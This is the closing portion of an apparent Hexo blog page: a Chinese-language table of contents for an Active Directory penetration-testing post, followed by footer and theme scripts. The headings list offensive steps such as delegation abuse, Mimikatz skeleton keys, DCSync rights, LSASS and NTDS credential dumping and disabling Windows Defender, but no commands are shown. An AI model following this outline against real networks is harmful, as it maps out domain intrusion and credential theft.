title="Windows"></a>Windows</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux"><span class="nav-number">1.4.8.2.</span> <span class="nav-text"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用PowerShell-Remoting执行命令"><span class="nav-number">1.4.9.</span> <span class="nav-text"><a href="#&#x4F7F;&#x7528;PowerShell-Remoting&#x6267;&#x884C;&#x547D;&#x4EE4;" class="headerlink" title="&#x4F7F;&#x7528;PowerShell Remoting&#x6267;&#x884C;&#x547D;&#x4EE4;"></a><strong>&#x4F7F;&#x7528;PowerShell Remoting&#x6267;&#x884C;&#x547D;&#x4EE4;</strong></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不受限制的委托"><span class="nav-number">1.4.10.</span> <span class="nav-text"><a href="#&#x4E0D;&#x53D7;&#x9650;&#x5236;&#x7684;&#x59D4;&#x6258;" class="headerlink" title="&#x4E0D;&#x53D7;&#x9650;&#x5236;&#x7684;&#x59D4;&#x6258;"></a><strong>&#x4E0D;&#x53D7;&#x9650;&#x5236;&#x7684;&#x59D4;&#x6258;</strong></span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Exploitation-1"><span class="nav-number">1.4.10.1.</span> <span class="nav-text"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#约束委派"><span class="nav-number">1.4.11.</span> <span class="nav-text"><a href="#&#x7EA6;&#x675F;&#x59D4;&#x6D3E;" class="headerlink" title="&#x7EA6;&#x675F;&#x59D4;&#x6D3E;"></a><strong>&#x7EA6;&#x675F;&#x59D4;&#x6D3E;</strong></span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Exploitation-2"><span class="nav-number">1.4.11.1.</span> <span class="nav-text"><a href="#Exploitation-2" class="headerlink" title="Exploitation"></a>Exploitation</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于资源的约束委派"><span class="nav-number">1.4.12.</span> <span class="nav-text"><a href="#&#x57FA;&#x4E8E;&#x8D44;&#x6E90;&#x7684;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;" class="headerlink" title="&#x57FA;&#x4E8E;&#x8D44;&#x6E90;&#x7684;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;"></a><strong>&#x57FA;&#x4E8E;&#x8D44;&#x6E90;&#x7684;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;</strong></span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Exploitation-3"><span class="nav-number">1.4.12.1.</span> <span class="nav-text"><a href="#Exploitation-3" class="headerlink" title="Exploitation"></a>Exploitation</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#滥用域信任"><span class="nav-number">1.4.13.</span> <span class="nav-text"><a href="#&#x6EE5;&#x7528;&#x57DF;&#x4FE1;&#x4EFB;" class="headerlink" title="&#x6EE5;&#x7528;&#x57DF;&#x4FE1;&#x4EFB;"></a><strong>&#x6EE5;&#x7528;&#x57DF;&#x4FE1;&#x4EFB;</strong></span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用域信任密钥"><span class="nav-number">1.4.13.1.</span> <span class="nav-text"><a href="#&#x4F7F;&#x7528;&#x57DF;&#x4FE1;&#x4EFB;&#x5BC6;&#x94A5;" class="headerlink" title="&#x4F7F;&#x7528;&#x57DF;&#x4FE1;&#x4EFB;&#x5BC6;&#x94A5;"></a><strong>&#x4F7F;&#x7528;&#x57DF;&#x4FE1;&#x4EFB;&#x5BC6;&#x94A5;</strong></span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用krbtgt哈希"><span class="nav-number">1.4.13.2.</span> <span class="nav-text"><a href="#&#x4F7F;&#x7528;krbtgt&#x54C8;&#x5E0C;" class="headerlink" title="&#x4F7F;&#x7528;krbtgt&#x54C8;&#x5E0C;"></a><strong>&#x4F7F;&#x7528;krbtgt&#x54C8;&#x5E0C;</strong></span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#滥用林间信任"><span class="nav-number">1.4.14.</span> <span class="nav-text"><a href="#&#x6EE5;&#x7528;&#x6797;&#x95F4;&#x4FE1;&#x4EFB;" class="headerlink" title="&#x6EE5;&#x7528;&#x6797;&#x95F4;&#x4FE1;&#x4EFB;"></a><strong>&#x6EE5;&#x7528;&#x6797;&#x95F4;&#x4FE1;&#x4EFB;</strong></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#滥用MSSQL数据库进行横向移动"><span class="nav-number">1.4.15.</span> <span class="nav-text"><a href="#&#x6EE5;&#x7528;MSSQL&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x6A2A;&#x5411;&#x79FB;&#x52A8;" class="headerlink" title="&#x6EE5;&#x7528;MSSQL&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x6A2A;&#x5411;&#x79FB;&#x52A8;"></a>&#x6EE5;&#x7528;MSSQL&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x6A2A;&#x5411;&#x79FB;&#x52A8;</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#特权提升"><span class="nav-number">1.5.</span> <span class="nav-text"><a href="#&#x7279;&#x6743;&#x63D0;&#x5347;" class="headerlink" title="&#x7279;&#x6743;&#x63D0;&#x5347;"></a>&#x7279;&#x6743;&#x63D0;&#x5347;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PowerUp"><span class="nav-number">1.5.1.</span> <span class="nav-text"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-UAC"><span class="nav-number">1.5.2.</span> <span class="nav-text"><a href="#Bypass-UAC" class="headerlink" title="Bypass  UAC"></a>Bypass  UAC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Persistence"><span class="nav-number">1.6.</span> <span class="nav-text"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#启动文件夹"><span class="nav-number">1.6.1.</span> <span class="nav-text"><a href="#&#x542F;&#x52A8;&#x6587;&#x4EF6;&#x5939;" class="headerlink" title="&#x542F;&#x52A8;&#x6587;&#x4EF6;&#x5939;"></a>&#x542F;&#x52A8;&#x6587;&#x4EF6;&#x5939;</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域持久性"><span class="nav-number">1.7.</span> <span class="nav-text"><a href="#&#x57DF;&#x6301;&#x4E45;&#x6027;" class="headerlink" title="&#x57DF;&#x6301;&#x4E45;&#x6027;"></a>&#x57DF;&#x6301;&#x4E45;&#x6027;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Mimikatz万能钥匙攻击"><span class="nav-number">1.7.1.</span> <span class="nav-text"><a href="#Mimikatz&#x4E07;&#x80FD;&#x94A5;&#x5319;&#x653B;&#x51FB;" class="headerlink" title="Mimikatz&#x4E07;&#x80FD;&#x94A5;&#x5319;&#x653B;&#x51FB;"></a>Mimikatz&#x4E07;&#x80FD;&#x94A5;&#x5319;&#x653B;&#x51FB;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用PowerView授予特定的用户DCSync权限"><span class="nav-number">1.7.2.</span> <span class="nav-text"><a href="#&#x4F7F;&#x7528;PowerView&#x6388;&#x4E88;&#x7279;&#x5B9A;&#x7684;&#x7528;&#x6237;DCSync&#x6743;&#x9650;" class="headerlink" title="&#x4F7F;&#x7528;PowerView&#x6388;&#x4E88;&#x7279;&#x5B9A;&#x7684;&#x7528;&#x6237;DCSync&#x6743;&#x9650;"></a>&#x4F7F;&#x7528;PowerView&#x6388;&#x4E88;&#x7279;&#x5B9A;&#x7684;&#x7528;&#x6237;DCSync&#x6743;&#x9650;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#域控制器DSRM管理员"><span class="nav-number">1.7.3.</span> <span class="nav-text"><a href="#&#x57DF;&#x63A7;&#x5236;&#x5668;DSRM&#x7BA1;&#x7406;&#x5458;" class="headerlink" title="&#x57DF;&#x63A7;&#x5236;&#x5668;DSRM&#x7BA1;&#x7406;&#x5458;"></a>&#x57DF;&#x63A7;&#x5236;&#x5668;DSRM&#x7BA1;&#x7406;&#x5458;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修改安全描述符以进行远程WMI访问"><span class="nav-number">1.7.4.</span> <span class="nav-text"><a href="#&#x4FEE;&#x6539;&#x5B89;&#x5168;&#x63CF;&#x8FF0;&#x7B26;&#x4EE5;&#x8FDB;&#x884C;&#x8FDC;&#x7A0B;WMI&#x8BBF;&#x95EE;" class="headerlink" title="&#x4FEE;&#x6539;&#x5B89;&#x5168;&#x63CF;&#x8FF0;&#x7B26;&#x4EE5;&#x8FDB;&#x884C;&#x8FDC;&#x7A0B;WMI&#x8BBF;&#x95EE;"></a>&#x4FEE;&#x6539;&#x5B89;&#x5168;&#x63CF;&#x8FF0;&#x7B26;&#x4EE5;&#x8FDB;&#x884C;&#x8FDC;&#x7A0B;WMI&#x8BBF;&#x95EE;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修改PowerShell远程访问的安全描述符"><span class="nav-number">1.7.5.</span> <span class="nav-text"><a href="#&#x4FEE;&#x6539;PowerShell&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#x7684;&#x5B89;&#x5168;&#x63CF;&#x8FF0;&#x7B26;" class="headerlink" title="&#x4FEE;&#x6539;PowerShell&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#x7684;&#x5B89;&#x5168;&#x63CF;&#x8FF0;&#x7B26;"></a>&#x4FEE;&#x6539;PowerShell&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#x7684;&#x5B89;&#x5168;&#x63CF;&#x8FF0;&#x7B26;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修改DC注册表安全描述符以使用DAMP进行远程哈希检索"><span class="nav-number">1.7.6.</span> <span class="nav-text"><a href="#&#x4FEE;&#x6539;DC&#x6CE8;&#x518C;&#x8868;&#x5B89;&#x5168;&#x63CF;&#x8FF0;&#x7B26;&#x4EE5;&#x4F7F;&#x7528;DAMP&#x8FDB;&#x884C;&#x8FDC;&#x7A0B;&#x54C8;&#x5E0C;&#x68C0;&#x7D22;" class="headerlink" title="&#x4FEE;&#x6539;DC&#x6CE8;&#x518C;&#x8868;&#x5B89;&#x5168;&#x63CF;&#x8FF0;&#x7B26;&#x4EE5;&#x4F7F;&#x7528;DAMP&#x8FDB;&#x884C;&#x8FDC;&#x7A0B;&#x54C8;&#x5E0C;&#x68C0;&#x7D22;"></a>&#x4FEE;&#x6539;DC&#x6CE8;&#x518C;&#x8868;&#x5B89;&#x5168;&#x63CF;&#x8FF0;&#x7B26;&#x4EE5;&#x4F7F;&#x7528;DAMP&#x8FDB;&#x884C;&#x8FDC;&#x7A0B;&#x54C8;&#x5E0C;&#x68C0;&#x7D22;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DCShadow"><span class="nav-number">1.7.7.</span> <span class="nav-text"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Post-Exploitation"><span class="nav-number">1.8.</span> <span class="nav-text"><a href="#Post-Exploitation" class="headerlink" title="Post-Exploitation"></a>Post-Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#LSASS保护"><span class="nav-number">1.8.1.</span> <span class="nav-text"><a href="#LSASS&#x4FDD;&#x62A4;" class="headerlink" title="LSASS&#x4FDD;&#x62A4;"></a>LSASS&#x4FDD;&#x62A4;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dumping-secrets-with-Mimikatz"><span class="nav-number">1.8.2.</span> <span class="nav-text"><a href="#Dumping-secrets-with-Mimikatz" class="headerlink" title="Dumping secrets with Mimikatz"></a>Dumping secrets with Mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#没有Mimikatz的密码hash转储"><span class="nav-number">1.8.3.</span> <span class="nav-text"><a href="#&#x6CA1;&#x6709;Mimikatz&#x7684;&#x5BC6;&#x7801;hash&#x8F6C;&#x50A8;" class="headerlink" title="&#x6CA1;&#x6709;Mimikatz&#x7684;&#x5BC6;&#x7801;hash&#x8F6C;&#x50A8;"></a>&#x6CA1;&#x6709;Mimikatz&#x7684;&#x5BC6;&#x7801;hash&#x8F6C;&#x50A8;</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Dumping-LSASS"><span class="nav-number">1.8.3.1.</span> <span class="nav-text"><a href="#Dumping-LSASS" class="headerlink" title="Dumping LSASS"></a>Dumping LSASS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Dumping-secrets-from-the-registry"><span class="nav-number">1.8.3.2.</span> <span class="nav-text"><a href="#Dumping-secrets-from-the-registry" class="headerlink" title="Dumping secrets from the registry"></a>Dumping secrets from the registry</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ntdsutil"><span class="nav-number">1.8.3.3.</span> <span class="nav-text"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a>ntdsutil</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#QuarkPwDump分析-下载地址-https-github-com-quarkslab-quarkspwdump"><span class="nav-number">1.8.3.4.</span> <span class="nav-text"><a href="#QuarkPwDump&#x5206;&#x6790;-&#x4E0B;&#x8F7D;&#x5730;&#x5740;-https-github-com-quarkslab-quarkspwdump" class="headerlink" title="QuarkPwDump&#x5206;&#x6790; [&#x4E0B;&#x8F7D;&#x5730;&#x5740;][https://github.com/quarkslab/quarkspwdump]"></a>QuarkPwDump&#x5206;&#x6790; [&#x4E0B;&#x8F7D;&#x5730;&#x5740;][<a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="noopener">https://github.com/quarkslab/quarkspwdump</a>]</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ntdsutil-ifm-模块"><span class="nav-number">1.8.3.5.</span> <span class="nav-text"><a href="#ntdsutil-ifm-&#x6A21;&#x5757;" class="headerlink" title="ntdsutil: ifm &#x6A21;&#x5757;"></a>ntdsutil: ifm &#x6A21;&#x5757;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux-明文密码的获取"><span class="nav-number">1.8.3.6.</span> <span class="nav-text"><a href="#Linux-&#x660E;&#x6587;&#x5BC6;&#x7801;&#x7684;&#x83B7;&#x53D6;" class="headerlink" title="Linux &#x660E;&#x6587;&#x5BC6;&#x7801;&#x7684;&#x83B7;&#x53D6;"></a>Linux &#x660E;&#x6587;&#x5BC6;&#x7801;&#x7684;&#x83B7;&#x53D6;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#从卷影副本中转储快照"><span class="nav-number">1.8.3.7.</span> <span class="nav-text"><a href="#&#x4ECE;&#x5377;&#x5F71;&#x526F;&#x672C;&#x4E2D;&#x8F6C;&#x50A8;&#x5FEB;&#x7167;" class="headerlink" title="&#x4ECE;&#x5377;&#x5F71;&#x526F;&#x672C;&#x4E2D;&#x8F6C;&#x50A8;&#x5FEB;&#x7167;"></a>&#x4ECE;&#x5377;&#x5F71;&#x526F;&#x672C;&#x4E2D;&#x8F6C;&#x50A8;&#x5FEB;&#x7167;</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关闭Windows-Defender"><span class="nav-number">1.8.4.</span> <span class="nav-text"><a href="#&#x5173;&#x95ED;Windows-Defender" class="headerlink" title="&#x5173;&#x95ED;Windows Defender"></a>&#x5173;&#x95ED;Windows Defender</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Chisel-代理"><span class="nav-number">1.8.5.</span> <span class="nav-text"><a href="#Chisel-&#x4EE3;&#x7406;" class="headerlink" title="Chisel &#x4EE3;&#x7406;"></a>Chisel &#x4EE3;&#x7406;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Juicy-files"><span class="nav-number">1.8.6.</span> <span class="nav-text"><a href="#Juicy-files" class="headerlink" title="Juicy files"></a>Juicy files</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="powered-by">
+<i class="fa fa-user-md"></i>
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+<div class="theme-info">
+ 
+  <span class="post-count">博客全站共45.9k字</span>
+</div>
+<div class="copyright" >
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yaron. All Right Reserved. 版权所有。</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user">本站总访问量</i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/love.js"></script>
+  <!-- 背景动画 -->
+  <script type="text/javascript" src="/js/src/particle.js"></script>
+  
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    document.getElementById("live2dcanvas").style.width = '75px';
+    document.getElementById("live2dcanvas").style.height = '150px';
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/miku.model.json", 0.5);});
+})();
+</script>
+
+</body>
+</html>
